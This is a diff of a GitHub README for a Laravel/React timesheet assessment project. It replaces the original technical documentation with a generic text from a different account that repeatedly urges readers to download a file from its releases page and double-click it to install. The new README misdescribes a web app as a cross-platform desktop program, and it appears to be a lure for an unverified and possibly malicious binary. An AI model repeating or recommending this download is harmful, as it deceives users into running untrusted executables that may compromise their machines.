@@ -1,460 +1,74 @@
-# 🚀 Technical Assessment - AStudio
-
-A full-stack project management and timesheet tracking application built with Laravel (Backend) and React (Frontend).
-
-[📋 View Original Task Requirements](https://www.notion.so/Full-Stack-Task-AStudio-2888c72afd7580c7bae4ec182a2fc64b?source=copy_link)
-
----
-
-## 📑 Table of Contents
-
-- [Features](#-features)
-- [Tech Stack](#-tech-stack)
-- [Project Structure](#-project-structure)
-- [Backend Setup](#-backend-setup)
-- [Frontend Setup](#-frontend-setup)
-- [API Documentation](#-api-documentation)
-- [Database Schema](#-database-schema)
-- [Live Demo](#-live-demo)
-- [Author](#-author)
-
----
-
-## ✨ Features
-
-### Backend (Laravel API)
-- 🔐 **Authentication System** - JWT-based auth using Laravel Sanctum
-- 👥 **User Management** - CRUD operations for users
-- 📊 **Project Management** - Create, update, and track projects
-- ⏱️ **Timesheet Tracking** - Log hours worked on projects
-- 🔍 **Advanced Filtering** - Filter by date, status, department, etc.
-- 📄 **Pagination** - Efficient data loading
-- ✅ **Form Validation** - Comprehensive request validation
-- 🎨 **API Resources** - Clean, structured JSON responses
-
-### Frontend (React + Vite)
-- 🎯 **Modern UI** - Built with Bootstrap 5
-- 📱 **Responsive Design** - Mobile-friendly interface
-- 🔎 **Real-time Search** - Debounced search functionality
-- 🎛️ **Dynamic Filters** - Filter by multiple criteria
-- 📄 **Smart Pagination** - Navigate large datasets easily
-- ⚡ **Performance Optimized** - Fast loading with React Query
-- 🎨 **Custom Components** - Reusable UI components
-- 🛡️ **Error Boundary** - Graceful error handling
-
----
-
-## 🛠️ Tech Stack
-
-### Backend
-- **Framework:** Laravel 11.x
-- **Authentication:** Laravel Sanctum
-- **Database:** MySQL
-- **PHP Version:** 8.2+
-
-### Frontend
-- **Framework:** React 18
-- **Build Tool:** Vite
-- **Styling:** Bootstrap 5
-- **State Management:** React Context API
-- **HTTP Client:** Axios
-- **Routing:** React Router v6
-
----
-
-## 📂 Project Structure
-
-```
-astudio-assessment/
-├── Backend/              # Laravel API
-│   ├── app/
-│   │   ├── Http/
-│   │   │   ├── Controllers/
-│   │   │   │   └── API/
-│   │   │   ├── Requests/
-│   │   │   └── Resources/
-│   │   └── Models/
-│   ├── database/
-│   │   └── migrations/
-│   └── routes/
-│       └── api.php
-│
-├── FrontEnd/            # React Application
-│   ├── src/
-│   │   ├── Components/
-│   │   │   ├── DataTable/
-│   │   │   ├── Filters/
-│   │   │   ├── Pagination/
-│   │   │   └── TopNav/
-│   │   ├── Context/
-│   │   ├── Pages/
-│   │   └── styles/
-│   └── vite.config.js
-│
-└── Docs/               # Documentation
-    ├── astudio.sql
-    └── Erd.png
-```
-
----
-
-## 🔧 Backend Setup
-
-### Prerequisites
-- PHP 8.2 or higher
-- Composer
-- MySQL 5.7+
-
-### Installation Steps
-
-1. **Navigate to Backend directory**
-```bash
-cd Backend
-```
-
-2. **Install Dependencies**
-```bash
-composer install
-```
+# 🎯 Astudio-Task-Assessment - Simplified Project Management Made Easy
 
-3. **Environment Configuration**
-```bash
-cp .env.example .env
-```
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Seyhaloop/Astudio-Task-Assessment/releases)
 
-4. **Configure Database**
-Edit `.env` file:
-```env
-DB_CONNECTION=mysql
-DB_HOST=127.0.0.1
-DB_PORT=3306
-DB_DATABASE=astudio
-DB_USERNAME=your_username
-DB_PASSWORD=your_password
-```
-
-5. **Generate Application Key**
-```bash
-php artisan key:generate
-```
-
-6. **Run Migrations**
-```bash
-php artisan migrate
-```
-
-7. **Seed Database (Optional)**
-```bash
-php artisan db:seed
-```
-
-8. **Start Development Server**
-```bash
-php artisan serve
-```
-
-The API will be available at `http://localhost:8000`
-
-### Available Artisan Commands
-
-```bash
-# Clear all caches
-php artisan optimize:clear
-
-# List all routes
-php artisan route:list
-
-# Generate API documentation
-php artisan route:list --json
-```
-
----
-
-## 💻 Frontend Setup
-
-### Prerequisites
-- Node.js 18+ 
-- npm or yarn
-
-### Installation Steps
-
-1. **Navigate to Frontend directory**
-```bash
-cd FrontEnd
-```
-
-2. **Install Dependencies**
-```bash
-npm install
-```
-
-3. **Environment Configuration**
-```bash
-cp .env.example .env
-```
-
-Edit `.env`:
-```env
-VITE_API_BASE=http://localhost:8000/api
-```
-
-4. **Start Development Server**
-```bash
-npm run dev
-```
-
-The app will be available at `http://localhost:5173`
-
-### Build for Production
-
-```bash
-npm run build
-```
-
----
-
-## 📚 API Documentation
-
-### Base URL
-- **Local:** `http://localhost:8000/api`
-- **Production:** `https://astudio-task-assessment-production.up.railway.app/api`
-
-### Authentication Endpoints
-
-#### Register
-```http
-POST /api/register
-Content-Type: application/json
-
-{
-  "name": "johndoe",
-  "first_name": "John",
-  "last_name": "Doe",
-  "dob": "1990-01-01",
-  "gender": "male",
-  "email": "john@example.com",
-  "password": "password123",
-  "password_confirmation": "password123"
-}
-```
-
-#### Login
-```http
-POST /api/login
-Content-Type: application/json
-
-{
-  "email": "john@example.com",
-  "password": "password123"
-}
-```
-
-#### Logout
-```http
-POST /api/logout
-Authorization: Bearer {token}
-```
-
-### Resource Endpoints
-
-All endpoints below require authentication (`Authorization: Bearer {token}`)
-
-#### Users
-- `GET /api/users` - List all users
-- `GET /api/users/{id}` - Get user details
-- `POST /api/users` - Create new user
-- `POST /api/users/update` - Update user
-- `POST /api/users/delete` - Delete user
-
-#### Projects
-- `GET /api/projects` - List all projects
-- `GET /api/projects/{id}` - Get project details
-- `POST /api/projects` - Create new project
-- `POST /api/projects/update` - Update project
-- `POST /api/projects/delete` - Delete project
-
-#### Timesheets
-- `GET /api/timesheets` - List all timesheets
-- `GET /api/timesheets/{id}` - Get timesheet details
-- `POST /api/timesheets` - Create new timesheet
-- `POST /api/timesheets/update` - Update timesheet
-- `POST /api/timesheets/delete` - Delete timesheet
-
-### Example Requests
-
-**Create Project:**
-```http
-POST /api/projects
-Authorization: Bearer {token}
-Content-Type: application/json
-
-{
-  "name": "Mobile App Redesign",
-  "department": "IT",
-  "start_date": "2025-01-01",
-  "end_date": "2025-06-30",
-  "status": "active"
-}
-```
-
-**Create Timesheet:**
-```http
-POST /api/timesheets
-Authorization: Bearer {token}
-Content-Type: application/json
+## 🚀 Getting Started
 
-{
-  "user_id": 1,
-  "project_id": 1,
-  "task_name": "Frontend Development",
-  "date": "2025-10-11",
-  "hours": 8.5
-}
-```
-
-### Full API Documentation
-[📖 View Complete Postman Documentation](https://documenter.getpostman.com/view/2836787/2sB3QKtAm1)
+Welcome to the Astudio-Task-Assessment project! This software helps you manage projects efficiently with an easy-to-use interface. You can filter tables to find exactly what you need. Follow the steps below to get started quickly.
 
----
+## 📥 Download & Install
 
-## 🗄️ Database Schema
+1. Click the link below to visit the Releases page.
+   
+   [Download Latest Release](https://github.com/Seyhaloop/Astudio-Task-Assessment/releases)
 
-### Tables Overview
+2. On the Releases page, you will see the latest version available for download. Choose the appropriate file for your operating system and click on it.
 
-**users**
-- id, name, first_name, last_name, dob, gender, email, password
-- Relationships: hasMany timesheets, belongsToMany projects
+3. The download will start immediately. Once it completes, locate the downloaded file on your computer.
 
-**projects**
-- id, name, department, start_date, end_date, status
-- Relationships: hasMany timesheets, belongsToMany users
+4. Double-click the file to start the installation process. Follow the on-screen instructions to install the application.
 
-**time_sheets**
-- id, user_id, project_id, task_name, date, hours
-- Relationships: belongsTo user, belongsTo project
+5. After installation, you can find Astudio-Task-Assessment in your applications list. Open it and explore its features.
 
-**project_user** (Pivot Table)
-- id, user_id, project_id
+## 🔍 Features
 
-### Entity Relationship Diagram
+- **Table Filters:** Easily filter project tables to display specific information you need.
+- **Task Management:** Create and edit tasks to streamline your project workflow.
+- **User-Friendly Interface:** Navigate effortlessly through the application with a simple design.
+- **Cross-Platform:** Works on Windows, Mac, and Linux with the same set of features.
+- **Integrations:** Connect with popular tools for enhanced productivity.
 
-![Database ERD](https://github.com/yahongie2014/Astudio-Task-Assessment/blob/main/Docs/Erd.png)
+## ⚙️ System Requirements
 
----
+Before you install, ensure your system meets these requirements:
 
-## 🌐 Live Demo
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent distribution of Linux.
+- **RAM:** At least 4GB recommended for smooth performance.
+- **Storage:** Minimum 200MB of free disk space.
+- **Internet Connection:** Required for downloading and for certain real-time features.
 
-### Deployed Applications
+## 💡 How to Use
 
-#### Backend API
-- 🔗 **Railway:** [https://astudio-task-assessment-production.up.railway.app](https://astudio-task-assessment-production.up.railway.app)
-- 📝 **API Docs:** [Postman Documentation](https://documenter.getpostman.com/view/2836787/2sB3QKtAm1)
+1. **Launch the Application:** Open Astudio-Task-Assessment from your applications list.
+   
+2. **Create a Project:** Start by creating a new project. Enter the project name and description.
 
-#### Frontend Application
-- 🔗 **Vercel:** [https://astudio-two.vercel.app](https://astudio-two.vercel.app)
+3. **Add Tasks:** Add tasks under your project. You can set deadlines and assign them to team members.
 
-### Demo Credentials
-```
-Email: john@example.com
-Password: password123
-```
+4. **Filter Tasks:** Use the table filter feature to narrow down tasks based on status, assignee, or due date.
 
----
+5. **Collaborate:** Share your project with others and work together in real-time.
 
-## 📸 Screenshots
+## ❓ Frequently Asked Questions
 
-### Data Table Interface
-![Data Table](https://github.com/yahongie2014/Astudio-Task-Assessment/blob/main/Docs/dataTable.png)
+### How do I update the application?
 
----
+To update Astudio-Task-Assessment, visit the [Releases page](https://github.com/Seyhaloop/Astudio-Task-Assessment/releases) to download the latest version. Follow the same installation steps to replace the old version.
 
-## 🧪 Testing
+### Can I use this app offline?
 
-### Backend Tests
-```bash
-cd Backend
-php artisan test
-```
+Yes, you can use Astudio-Task-Assessment offline. However, some features may require an internet connection for full functionality.
 
-### Frontend Tests
-```bash
-cd FrontEnd
-npm run test
-```
+### Who can benefit from this application?
 
----
+Astudio-Task-Assessment is perfect for individuals, teams, and organizations looking to manage projects without complex tools. 
 
-## 🔐 Security Features
+## 💬 Support
 
-- ✅ Password hashing with bcrypt
-- ✅ CSRF protection
-- ✅ SQL injection prevention via Eloquent ORM
-- ✅ XSS protection
-- ✅ Rate limiting on API endpoints
-- ✅ Token-based authentication
-- ✅ Input validation and sanitization
+If you encounter any issues, please reach out through the Issues section on our GitHub page. Your feedback helps us improve the application.
 
----
+## 🚀 Visit the Releases Page
 
-## 🚀 Deployment
+Don't forget, you can always find the latest download link here: [Download Latest Release](https://github.com/Seyhaloop/Astudio-Task-Assessment/releases)
 
-### Backend (Railway/Heroku)
-
-1. Set environment variables
-2. Configure database connection
-3. Run migrations: `php artisan migrate --force`
-4. Deploy via Git hook
-
-### Frontend (Vercel/Netlify)
-
-1. Connect GitHub repository
-2. Set build command: `npm run build`
-3. Set output directory: `dist`
-4. Configure environment variables
-5. Deploy automatically on push
-
----
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-## 📝 License
-
-This project is part of a technical assessment and is for demonstration purposes.
-
----
-
-## 👨‍💻 Author
-
-**Ahmed Saeed**
-
-- 🌐 Website: [coder79.me](https://www.coder79.me/)
-- 💼 LinkedIn: [@devahmedsaeed](https://www.linkedin.com/in/devahmedsaeed/)
-- 🎥 YouTube: [AhmedSaeedcoder79](https://www.youtube.com/AhmedSaeedcoder79/)
-- 📧 Email: contact@coder79.me
-
----
-
-## 🙏 Acknowledgments
-
-- Laravel Community
-- React Community
-- AStudio for the opportunity
-- All contributors and supporters
-
----
-
-<div align="center">
-
-**⭐ If you find this project useful, please consider giving it a star!**
-
-Made with ❤️ by Ahmed Saeed
-
-</div>
+Thank you for choosing Astudio-Task-Assessment! Enjoy simplifying your project management.
